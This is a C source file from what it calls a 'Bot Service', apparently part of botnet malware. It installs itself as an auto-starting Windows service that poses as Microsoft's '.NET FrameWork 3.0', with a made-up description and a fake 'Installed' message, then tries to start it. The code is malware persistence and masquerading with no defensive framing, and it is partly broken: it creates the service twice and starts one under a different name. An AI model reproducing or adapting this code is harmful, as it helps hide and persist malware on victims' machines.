#include "includes.h"
#include "service.h"

int service()
{
	char system[MAX_PATH];
	char windows[MAX_PATH];
	char pathtofile[MAX_PATH];
	VerInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&VerInfo);
	hAdvapi  = LoadLibrary("advapi32.dll");
	HMODULE GetModH = GetModuleHandle(NULL);
	SC_HANDLE hService, hSCManager;
	GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
	GetSystemDirectory(system,sizeof(system));
	GetWindowsDirectory(windows,sizeof(windows));
	
	uChangeServiceConfig2 = (UCHANGESERVICECONFIG2)GetProcAddress(hAdvapi, "ChangeServiceConfig2A");
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	hSCManager = OpenSCManager(NULL, NULL, SERVICE_DEMAND_START);
	
	if (!hSCManager) {
		exit(0);
	}
	
	GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
    GetSystemDirectory(system,sizeof(system));
    GetWindowsDirectory(windows,sizeof(windows));
    strcat(system,"\\SySExpress.exe");
    strcat(windows,"\\SySExpress.exe");
	hService = CreateService(hSCManager, ".NET FrameWork 3.0", ".NET FrameWork 3.0",
		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
		SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, windows,
		NULL, NULL, NULL, NULL, NULL); 
	hService = CreateService(hSCManager, ".NET FrameWork 3.0", ".NET FrameWork 3.0",
		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
		SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, system,
		NULL, NULL, NULL, NULL, NULL); 
	if (hService) 
	{
		printf(".NET Framework By microsoft, Installed.");
		if (VerInfo.dwMajorVersion >= 5) {
			SERVICE_DESCRIPTION info;
			info.lpDescription = ".NET FrameWork 3.0: Latest version of the engine, Allows programs like messenger and internet explorer 7 to be ran on the system";
			uChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, &info);
		}
		CloseServiceHandle(hService);
	} else
		printf("Failed to install Bot Service - %s", show_error(GetLastError()));
	CloseServiceHandle(hSCManager);
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	hService = OpenService(hSCManager, ".NET FRAMEWORK 2.0", SERVICE_START); 
	if (StartService(hService, 0, NULL)) 
#ifndef NO_DEBUG
		printf("Bot Service started successfully");
#endif
	else
		printf("Failed to start Bot Service - %s", show_error(GetLastError()));
	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);
	return 0;
}
